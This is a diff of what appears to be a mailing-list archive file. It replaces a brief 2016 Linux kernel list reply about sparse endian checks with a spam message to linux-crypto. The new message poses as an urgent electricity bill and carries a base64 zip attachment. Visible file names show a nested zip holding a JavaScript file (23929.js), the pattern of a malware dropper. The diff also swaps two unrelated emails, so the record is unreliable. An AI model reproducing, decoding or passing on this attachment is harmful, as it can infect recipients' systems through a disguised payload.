@@ -1,51 +1,101 @@
-From: Bart Van Assche <Bart.VanAssche@sandisk.com>
-Subject: Re: [PATCH] linux/types.h: enable endian checks for all sparse builds
-Date: Fri, 9 Dec 2016 15:18:02 +0000
-Message-ID: <BLUPR02MB168371E06EFA9AB34AA2C58181870@BLUPR02MB1683.namprd02.prod.outlook.com>
-References: <1481164052-28036-1-git-send-email-mst@redhat.com>
-	<BLUPR02MB168374E98A6C86E43DF0BCFE81840@BLUPR02MB1683.namprd02.prod.outlook.com>
-	<20161208075152-mutt-send-email-mst@kernel.org>
-	<BLUPR02MB168304F8FBA50C916A6A4E6081840@BLUPR02MB1683.namprd02.prod.outlook.com>
-	<20161208163658-mutt-send-email-mst@kernel.org>
-	<6199215E-2AA4-4705-9552-5D61FE03F866@cavium.com>
+From: <barbara.polaszek@umk.pl>
+Subject: Fri, 09 Dec 2016 16:11:33 -0000.Dear linux-crypto Your Electricity Bill.7512902343099$$$!!!16141866278
+Date: Fri, 09 Dec 2016 16:11:33 -0000
+Message-ID: <148129989393.32573.4527612283086351395@v4.ngi.it>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="windows-1252"
-Content-Transfer-Encoding: quoted-printable
-Cc: "kvm@vger.kernel.org" <kvm@vger.kernel.org>,
-	Neil Armstrong <narmstrong@baylibre.com>, David Airlie <airlied@linux.ie>,
-	"linux-remoteproc@vger.kernel.org" <linux-remoteproc@vger.kernel.org>,
-	"dri-devel@lists.freedesktop.org" <dri-devel@lists.freedesktop.org>,
-	"virtualization@lists.linux-foundation.org"
-	<virtualization@lists.linux-foundation.org>,
-	"linux-s390@vger.kernel.org" <linux-s390@vger.kernel.org>,
-	"James E.J. Bottomley" <jejb@linux.vnet.ibm.com>,
-	Herbert Xu <herbert@gondor.apana.org.au>,
-	"linux-scsi@vger.kernel.org" <linux-scsi@vger.kernel.org>,
-	Christoph Hellwig <hch@infradead.org>,
-	"v9fs-developer@lists.sourceforge.net"
-	<v9fs-developer@lists.sourceforge.net>, Asias He <asias@redhat.com>, Arnd
-	Bergmann <arnd@arndb.de>,
-	"linux-kbuild@vger.kernel.org" <linux-kbuild@vger.kernel.org>,
-	Jens Axboe <axboe@fb.com>, Michal Marek <mmarek@suse.com>,
-	Stefan Hajnoczi <stef
-To: "Madhani, Himanshu" <Himanshu.Madhani@cavium.com>, "Michael S. Tsirkin"
-	<mst@redhat.com>
-Return-path: <virtualization-bounces@lists.linux-foundation.org>
-Content-Language: en-US
-List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/virtualization>,
-	<mailto:virtualization-request@lists.linux-foundation.org?subject=unsubscribe>
-List-Archive: <http://lists.linuxfoundation.org/pipermail/virtualization/>
-List-Post: <mailto:virtualization@lists.linux-foundation.org>
-List-Help: <mailto:virtualization-request@lists.linux-foundation.org?subject=help>
-List-Subscribe: <https://lists.linuxfoundation.org/mailman/listinfo/virtualization>,
-	<mailto:virtualization-request@lists.linux-foundation.org?subject=subscribe>
-Sender: virtualization-bounces@lists.linux-foundation.org
-Errors-To: virtualization-bounces@lists.linux-foundation.org
-List-Id: linux-crypto.vger.kernel.org
+Content-Type: application/zip; name="URGENT_805395950816022_linux-crypto.zip"
+Content-Transfer-Encoding: base64
+To: <linux-crypto@vger.kernel.org>
+Return-path: <linux-crypto-owner@vger.kernel.org>
+Received: from 88-147-109-10.v4.ngi.it ([88.147.109.10]:51256 "HELO v4.ngi.it"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S933991AbcLIQLi (ORCPT <rfc822;linux-crypto@vger.kernel.org>);
+        Fri, 9 Dec 2016 11:11:38 -0500
+Content-Disposition: attachment
+Sender: linux-crypto-owner@vger.kernel.org
+List-ID: <linux-crypto.vger.kernel.org>
 
-On 12/08/16 22:40, Madhani, Himanshu wrote:
-> We=92ll take a look and send patches to resolve these warnings.
-
-Thanks!
-
-Bart.
+UEsDBAoAAgAAAAGwiUmgLIndzxEAAM8RAAANABwAMjM5MjlfWklQLnppcFVUCQADAdVKWAHVSlh1
+eAsAAQQAAAAABAAAAABQSwMEFAACAAgAAbCJSf9mdiMpEQAA3CsAAAgAHAAyMzkyOS5qc1VUCQAD
+AdVKWAHVSlh1eAsAAQQAAAAABAAAAADtWllv5bqRfu7+FQeGgdONShwf2+3lepwgQDLAvEwC5CEB
+BnMBSqIkaqM2SqIG/u+p4ibJt/tinoMYDfThTha/qvqqqIn1p2Vk2SBOb6erulAlXOdynBlclyyL
+eQrXg0qxFCeq4w2Ha5k2bGRw9fp5wrGpGCoxsqRROH7ULZfpaRZNIufT29vprJqEp6Lhydl2T1Rb
+y4qWiqu388/t+fV6KtQwikVg8ScsyqViTaIGLP4Oi2oq5VUYK5KIxja6LiR2uMEO2cxaMSgs/d10
+56NOsMCpqWCTG9vnKhlFL0safv94//DoGuqJ5YumWuFGLaKqafLzGQtsFmsvhgXLX7FYZqzp9OIn
+TXW9iqqQNLxkxcKaHq5Vw6dew7WOcr3oNUcBDqJkiYRrFkdyEZkbXg4omNHsqMD5GW1/LkXUYGHE
+QjyqUZQx7SXHoqjUqKs3N3jm5cRpKC2BPWLs4dZx53CLYWmgUsESN5QXvZppKDZJOlTH+ozlJQmg
+p4WyTs8rd/IVverfzm6oznM9GWld62GQUy0QGDNfVTXhgfNc4Pl5pGeEiS5UT0euuRsr0kq0PDaX
+j4hyJ3awclux2HIr2xXc6FbHnV5p7ISzimQSVYyy7gacEQKGIMAHCDl+5ZxHqjZ3TFKSaaKqijsx
+xZVY+Ej4aejyKx4XJIjRjR1m2RjVULHblkwjOU9YSAxY5l67o6yR6AteNnTgz6lq4lHI5tQsauB5
+9+Xr6f8+f+pxpR7rcP3Xz+92AVkhoiyEEDWViHm1wHXLRlVleNI5EjPLazxZHslpRcmytdJud2PL
+E1mbwaqB6zWRrV5XFEPBZ+rKh0qtsm4JjSpCsOHoKHWDWSonndDYeYh70Y43Q86vTnC6qirXJepU
+UWlzZeaIUc4L5WHS67ySi0drw0oS6W/xp8dZFam4UEVuYIor56KbVAxOgmCFB5vc8LQDb3M3vEj0
+Kox2/IXAYPePK0SE5gjlqxYqFlhsS1nJKmMBp1HH+1YuxqSNKI5FZzpDTJj9Q9g6mF1js8rIwrnB
+aCnUOtDY889vtHSs40aSin4xS9cqIyxcExaaXA4Frwuvlu0kx8jgpeFkNP5mFHFEABCqNSFG59zp
+JM9yPeZh0yyddFHqovbWyBgBq11OP4yKObtp9IyspDcnhez1bITNUjxkv8gIpTvqvpd1jUqTjmrB
+/2KVDRKRFcsu5d6Mow7UZtsQ9AO8aoDTCry4oeIja1PCV8zc0E5VpTJbrnjBM8JDittDazvR9kiC
+uL4maVxIGoSCg4bkvKrFIgd20JHgObyiyIRPBomRTFa47krds6+vr24XTaESXttLIzciZj4pJ0NR
+y5rVTt/VmrMsxUJ9fj1sIxKTRPObxuLX96HWlnfGg9XJDV/46XfxqZUz71F7qsrU0N9v/7zwWNHM
+f5VenYZEVqzlJaPhvWoO6/O1VAWebfj15XmKTtl6a8QhbBAk7Wn5XON91amqeYQXlvCuZWsi/DWr
+AiFSmOUTgSOsv4HgasB5GfCgJ3vhTXA560avxtj8PKMkezxM791EFclVNaV2IrdmjER+OKNOeb6w
+aFHlD+0hj3PlHHKsT6dIt2wYUJyNbHuZIsasdC3HGHCvWOFNBptUNYoutUAmlzchjNNZoghy1HAU
+GCf59IiICM84LZqEgKMROzJjCUnmLMZCOroSI6Q7s5nJK62fDYsngpOZ0pkDM+/b4cQzcoSGxaw9
+HPiqlWvDmolFRG7et+4sHtRYKNvZ8JNODLqmfT09vIbxrtbLrBZjY3aJCu4ck9VyLPwnFUjV8Te5
+v1l09NNDcmGVuVGRJLw5XbcLX0o1NNqdiFcxSyLlTM5c8jwR3sbysdNVb8BkZkW4FWxVPeKuZvHE
+EsSVGDoEVdvpoqCbEL04SKdSsywisR23k2VEtOZ2O6upCuhoRGlYAAp9irQDX5eKSDZew0UhY+Pe
+FyzUovDKtwjEvBET2Xts/yuJxvE259QsefPWFhmcN3IaDxKboxrLAs6ogLMniKlUNgURnmlgE4pA
+LZ5CZJXujIybSZYc7ULbc6RqePwvm7zBixqMlL0LXTo2mi2/GrdP/NxtzpB0/F0SgzNM3RUGPxZx
+l1tYQOCx4CmsIh6Bui2Qn6pREZFLsMX7wG5BreNFGG5dGBjvBc5x4fUOslFjhXPxvERb0B0tWq6R
+LcrtchEjje7o+qzC+xt29f6OJzb1vDK4MvcpRzExR3FVI2pv1ddBpLpzeui9kZxw7okvxve7S3Ho
+tTeDBaCJllE1bPA831N6XZZssl6EhhgL4bk5+R23tnE+lpef/suHJ7LoRGF4g9ku8RRd4R0Mwm1e
+dNIoVkXukS0tbcyHEqMcK5EyC32jXmphpSV2DJnLYgEPHuvgYA6EcGI4FLX4mKbkq3PmfEWbOOF4
+jnSIrej2kWvOLZFFEWWi7nhCnUTkzQEfZW/5nuEY8WJJBgUgGo1M6YWpRlYTK/nDxvdmvSJ968SI
+w18uF3cfXcMWrDZTGkLjMOOU1QPHOmRkK8iueKBEayZTvQQkeH6LnckBGZLrOKdnulakGwaXVhTE
+Ln7ob0ZWSuMwMu1CzjlmtTk0rVGjW3M/RZuyVk1bNCS7SCJtNYNRi6KU031UPMf7CEEV+HgKTCgF
+XlqrSHCP1o8TlYXAYsEiHgzYweMclRAppadrBe8ioyHWtLobIvs6Sa8fJkZyBQqUQiSFTsroNeF+
+EhGybDdeRix3ka4qNCnHq+GvevbRfs7rSLmxztq7i7Qm35FkY/e9bnl4qLkwsqJwHVykDiZIp8M6
+VQGrJWAVxDOPXCStaGyc43dlrZdb0Jgw/P3ftC+yY6oJ16Qy9E56NDCygAaHZbAwJtZjqCtY1gqG
+sHqLMOvMBctGqhSh+JM57cLib6hkVSysy3s1ZMIJy8ZzjkP4oM6FBC6yw1IWYoFGp6o3kpZTgW7D
+1Vc8Xcy9FynLWWXUkbxBOqKDYjVzUG10rbvFxbTBtI28KXm5mRieF2q0nqnAo6TK2SYTObiJffjg
+jGDqnVqK4Kp1lLKhJ8707elyuXWkSY+TyHLeu7CPRyWPUaZ+xxA2C26f+D+u70+ODLmXJiw1DMTZ
+K2d2vNFy2yHLtY/WdTVJY4HJIlpog0E1GECDwTKqaM3aiiPLVXlDGEtjPaVqtUYzliG8RvVNcm1s
+l8wQk9YygDEKEOwBOCYMjgQf7M/QyDoTeGk/NEA6V03jEEaezG3OBY+0QwxhHfpsHBsQVuiUru/u
+4ebl7sWZFV1FejTSuzEWYRVp5hSj5fnEN5IUuUlLz+hEizudnOewlhjcDGAHG6+DzLkUJgUHlH0L
+6p21apm5w7tJ//hMVM0zz6+MkXQFspTelKLC5iy1ntfsz8YyDsIuoMHSRAruopoj05ZlyqJqYxuV
+jlbZLYq82bkrVd2dN8oRGgOFzlUe88zbNh/pOmtI4e7iyKbFMxb+tOkWbge5/CwCtdm2JVq0TD8O
+6UK/ulNLq7KJZf+Pzuukx/7HkFKVziqxpt/bDuI5E98dGfr0tc6QZyPh3aS58KrlUaPSng552SS5
+a6BJhlmMcX76sj8OTRKzgZ/GXvGfPn8S6emLSxXv3DOli2WEkh7PZlXTbcueYXPKqoHbNssnkUX3
+DRrgjVF++pSh41UVbfL89HS5fTq/+u6sH/WMLgubHp4uplrMoip1wzICiR8Joecv+zzdYvNWE+ZW
+Ke8kanlJXub8+PDy8rJbeBIYr6W8LHcbff9M/3aisMpMxljVEe+v7EHRZ0Yma/3t5ZmG6bJDrcGy
+a4AttX1odj/gdHtzeX5+ojYDVEJv1lGPh5dbXzsLXDEznCDqWUpKiSuHyssdzuOKr2bbUc8Zrmcu
+lQ7070v9F7vUYHZ+cuoveyRgJOWdQbLLZBJ93LIJwVziVMq8kglFzOcBIwCJfnRuz65ZJ7HuVJog
+UyD39XLzjN7rE0fCNy88yiQRrn0f2CZ0MyTogdgoV+v9nh8fXX2hkWY0ncnjLBGbJ05r0oUEw/f2
+RlC53+AYHAe1XBlPcbUDJL1C8MikpPZnt43FKNqVmyTIWabCwmNXecVbxFCbUVrdV1tEI+OcdUSO
+/+6bqSn11ImW/OeeW8HJ9/zQ6fx0j5d9xg6uLuxJJ8gXbaKjLlUxqnSVBb/y+DxxVLhw+OBJ6PB0
+g+7k1LZ5NVyOlRFPCzmvwmmy7bMFrqhHz4++yWykGXVsc3kv9w+vW/1MKdBauzQP/clUIs3LDZN8
+frq/O+96y7kXPd4pge/yePN0t2tbVc4r8w7mZ4Ct/65f1aG6Tt3epNgGlNOYIlehx0t0TruWaUQO
+Ps3abOrxcv/wFDa1a3myde9BHk7v9zntNxPiOeRcHSS0ILkaRUNU2R9rV3X1cPtwe7naL2EG6RqD
+Fn04DC0d6g8XadsOiVe66m93L6GDhXmj4owXdFpWtSLPtT/vp63p4qrety3t8GSX2l6ED0ctZLOw
+wSSUGj6f/ohUY+L/+IvxDV/sU9TX123DBw5CG77dtkvtW+bwbaeXWx9rwItajgh+OtTd8+XuEo5k
+FaWvUdixPMLCtaGoTDr4qPNBWsiz2Vyiau2kYpsi0RY6YxTBnDWS2qg6rorBfBWzRjTGCB+aCjRp
+sXkd2DpBmNB3fd+JYf9o8PYrkohYQQ9TTWrY/be7y9P9VVj60Hj/ctgSBiMYZ7PRmtTHp7u72+Nx
+clSshJs49/INA5HQyJsBjY/MFTmB0At2M36/664AKMF0Zc0ss+K4Kp8LkfAqljHxBMMhDu3dzKNa
+tKz/cLdOdgfQWkl6nv4jKXr8/k94xPnfL/YpCPybBdhsOoSXffBviRACHPAvVbBLVYLLa4P/HAG2
+lAf4JBj4F1EIGVLw742w5dnAh4DgP5iAkJoE/xQOW7wDLqcAPh0A7jkBfLYHfLoJ/Ocb4LJmEN6E
+wGc7wOesYXvwh93TJmyBIrgvEcBnHcG9JYJ7dQebfIGQEwCfvAIXNUN4oYaQ3wf3bQT41xtwWV1w
+mXgIz2AQXtPAZ/jBJV4h5M8hvLJDSNrBLkEOIW4Gl+MC95wKWyoEwvMsbA8n4L9qgJBpgPA9APjP
+csB/dQEh4QhbTgt2z+zgMr/g8iAQ3sFh960KbM9kYB9VfxNyQ1+DnhwVxHpEOcvBfIPxS5tIGhTa
+rS/d6Y41xiPyCTmxovnuDNaYpDKPdD6woz/GP7xjZhLTDw9bJbruSBr7vWVwEM+m63HijCHUyo+G
+3jSVrO9lbBJOqDiim+TVsYNYC9HzepajsXE398/Pz8ceXa3pbYc24meD3bCt867jy8M3gpGrCF3e
+9xINDygfXbpr314Lf4+u5LJv/tQ2ainQKiXGqG9bcO4glpUyHGLXD/XbPYPuuu+6npeR96juKyfa
+6Rs+TF3GEtlopedpx+/CugqXslJ8+dBUNOiFGvtx0bfLfeA9oUM6yH6hJBSN/3igiZU17j1KiMmF
+qWAbdOi/6/t8MfbU13yYVqasrVhn3mGe7+93PnO7qPcPruXzL/WH7urwecEPnIyRn0jRflEUTBLH
+MJnPLPg+Q/8avYiYQqS725vHfYvKM5nozEQHYlaDOIxrcp6sqjRc8/7m+eF53yjWmA+1Nrnl0BHC
+jL7rvtv2G+jTpSTiUcGCgPSoKhZlPC4Nb7i9u78cdsN7MZjXj8eXffXKi1TTx2m78eA6+36hj/uB
+LAEhNwxsOB/oqRH79ij1H6fL7eNOR+Qq7dN+r9tU9hhtVlcHkaQVWzGA6SmN9nRze9hnU/MBXR99
+jWjngV3/75BkG3vZW0Kf2ulm+WgFzfcGixhHmRhLhWHt5dE3RCJF/54b5fFvA7B19914O6LLTFrz
+jnhjbnhf9Uyy9OVfBv33D4//TuT86yRy3v8JUEsBAh4DFAACAAgAAbCJSf9mdiMpEQAA3CsAAAgA
+GAAAAAAAAQAAAKSBAAAAADIzOTI5LmpzVVQFAAMB1UpYdXgLAAEEAAAAAAQAAAAAUEsFBgAAAAAB
+AAEATgAAAGsRAAAAAFBLAQIeAwoAAgAAAAGwiUmgLIndzxEAAM8RAAANABgAAAAAAAAAAACkgQAA
+AAAyMzkyOV9aSVAuemlwVVQFAAMB1UpYdXgLAAEEAAAAAAQAAAAAUEsFBgAAAAABAAEAUwAAABYS
+AAAAAA==
